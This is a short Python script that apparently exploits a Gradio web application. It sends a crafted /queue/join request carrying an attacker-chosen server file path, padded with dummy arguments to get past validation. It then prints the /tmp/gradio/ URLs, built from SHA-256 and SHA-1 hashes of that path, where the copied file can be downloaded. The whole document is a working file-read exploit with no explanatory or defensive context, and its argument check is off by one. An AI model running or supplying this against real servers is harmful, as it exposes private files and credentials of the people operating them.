# /// script
# requires-python = ">=3.12"
# dependencies = [
#     "requests",
# ]
# ///
import requests
import sys
import hashlib
from pathlib import Path

if len(sys.argv) < 2:
    print(f"Usage: python {sys.argv[0]} <path>")
    sys.exit(1)

path = sys.argv[2]  
appUrl = sys.argv[1].strip("/")

requestUrl = f"{appUrl}/queue/join?"
headers = {"content-type": "application/json"}

data = {
    "data": [
        { # path must in json object
            "path": path, # the payload url
        },
        # just add many arguments here to pass the validation
        "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a"
    ],
    "event_data": None, # value doesn't matter
    "fn_index": 0,
    "trigger_id": 2, # value doesn't matter
    "session_hash": "0" # value doesn't matter
}

response = requests.post(requestUrl, headers=headers, json=data)
print(response.text)
sha256 = hashlib.sha256()
sha256.update(path.encode("utf-8"))
sha1 = hashlib.sha1()
sha1.update(path.encode("utf-8"))
print(f"file in {appUrl}/file=/tmp/gradio/{sha256.hexdigest()}/{Path(path).name}")
print(f"file in {appUrl}/file=/tmp/gradio/{sha1.hexdigest()}/{Path(path).name}")
